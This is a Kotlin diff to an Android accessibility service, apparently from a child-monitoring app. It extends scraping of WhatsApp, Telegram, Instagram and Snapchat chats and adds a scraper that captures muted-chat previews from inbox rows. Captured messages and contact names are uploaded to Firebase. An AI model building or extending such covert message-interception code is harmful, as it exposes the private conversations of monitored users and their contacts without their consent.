@@ -50,11 +50,13 @@ class VyraAccessibilityService : AccessibilityService() {
             handleVivoInCallScreen(event)
         }
 
-        // 3. SOCIAL APP CHAT & CAMERA TRAP
+        // 3. SOCIAL APP CHAT & CAMERA TRAP (Captures normal & muted chats)
         if (targetSocialPackages.contains(packageName)) {
             handleSocialAppActivity(packageName, event)
             if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
-                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
+                event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 val appName = when {
                     packageName.contains("instagram") -> "Instagram"
                     packageName.contains("whatsapp") -> "WhatsApp"
@@ -62,9 +64,21 @@ class VyraAccessibilityService : AccessibilityService() {
                     packageName.contains("snapchat") -> "Snapchat"
                     else -> "Social"
                 }
-                val activeContact = extractActiveChatContact(packageName, rootInActiveWindow)
+                val root = rootInActiveWindow
+                val headerContact = extractActiveChatContact(packageName, root)
+                val activeContact = if (headerContact.isNotBlank()) {
+                    com.vyra.kids.core.ActiveContactTracker.recordContact(appName, headerContact)
+                    headerContact
+                } else {
+                    com.vyra.kids.core.ActiveContactTracker.getLastContact(appName, maxAgeMinutes = 15) ?: ""
+                }
+
                 if (activeContact.isNotBlank()) {
-                    scrapeSocialChatNodes(appName, activeContact, rootInActiveWindow)
+                    // Inside active chat thread (captures incoming/outgoing even if muted)
+                    scrapeSocialChatNodes(appName, activeContact, root)
+                } else {
+                    // In conversation list view (captures muted unread chat snippets right from inbox)
+                    scrapeSocialInboxList(appName, packageName, root)
                 }
             }
         }
@@ -233,6 +247,93 @@ class VyraAccessibilityService : AccessibilityService() {
         }
         for (i in 0 until node.childCount) {
             scrapeSocialChatNodes(appName, activeContact, node.getChild(i))
+        }
+    }
+
+    /**
+     * Muted Chat Scraper: Extracts last message previews directly from WhatsApp, Telegram,
+     * and Instagram inbox rows even if notifications are disabled/muted for the chat.
+     */
+    private fun scrapeSocialInboxList(appName: String, packageName: String, root: AccessibilityNodeInfo?) {
+        if (root == null) return
+        try {
+            when {
+                packageName.contains("whatsapp") -> {
+                    val nameNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversations_row_contact_name")
+                    for (nameNode in nameNodes) {
+                        val contactName = nameNode.text?.toString()?.trim() ?: continue
+                        if (contactName.isBlank() || isNavKeyword(contactName)) continue
+
+                        val rowParent = nameNode.parent ?: continue
+                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.whatsapp:id/single_msg_tv") +
+                                rowParent.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversations_row_message")
+                        for (msgNode in msgNodes) {
+                            val msgText = msgNode.text?.toString()?.trim() ?: continue
+                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
+                                recordInboxSnippet(appName, contactName, msgText)
+                            }
+                        }
+                    }
+                }
+                packageName.contains("telegram") -> {
+                    val nameNodes = root.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/dialog_name")
+                    for (nameNode in nameNodes) {
+                        val contactName = nameNode.text?.toString()?.trim() ?: continue
+                        if (contactName.isBlank() || isNavKeyword(contactName)) continue
+
+                        val rowParent = nameNode.parent ?: continue
+                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/dialog_message")
+                        for (msgNode in msgNodes) {
+                            val msgText = msgNode.text?.toString()?.trim() ?: continue
+                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
+                                recordInboxSnippet(appName, contactName, msgText)
+                            }
+                        }
+                    }
+                }
+                packageName.contains("instagram") -> {
+                    val nameNodes = root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_inbox_username")
+                    for (nameNode in nameNodes) {
+                        val contactName = nameNode.text?.toString()?.trim() ?: continue
+                        if (contactName.isBlank() || isNavKeyword(contactName)) continue
+
+                        val rowParent = nameNode.parent ?: continue
+                        val msgNodes = rowParent.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_inbox_digest")
+                        for (msgNode in msgNodes) {
+                            val msgText = msgNode.text?.toString()?.trim() ?: continue
+                            if (msgText.length > 1 && !isNavKeyword(msgText)) {
+                                recordInboxSnippet(appName, contactName, msgText)
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun recordInboxSnippet(appName: String, contactName: String, msgText: String) {
+        val cleanText = msgText.trim()
+        if (cleanText.isEmpty() || isNavKeyword(cleanText)) return
+
+        // 5-minute deduplication window for inbox previews
+        val timeBucket = System.currentTimeMillis() / 300000
+        val hash = "inbox:$appName:$contactName:$cleanText:$timeBucket".hashCode()
+        if (!processedChatHashes.contains(hash)) {
+            if (processedChatHashes.size > 1000) processedChatHashes.clear()
+            processedChatHashes.add(hash)
+
+            com.vyra.kids.core.ActiveContactTracker.recordContact(appName, contactName, cleanText)
+            val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
+            val msgId = "inbox_${System.currentTimeMillis()}_${Math.abs(hash).toString().take(6)}"
+            firebaseSync.syncChatMessage(
+                msgId = msgId,
+                app = appName,
+                sender = contactName,
+                text = cleanText,
+                isDeletedBySender = false,
+                isWatchlistTarget = false
+            )
+            Log.i(AppConstants.TAG, "Muted/Inbox Chat Captured [$appName] $contactName: $cleanText")
         }
     }
 
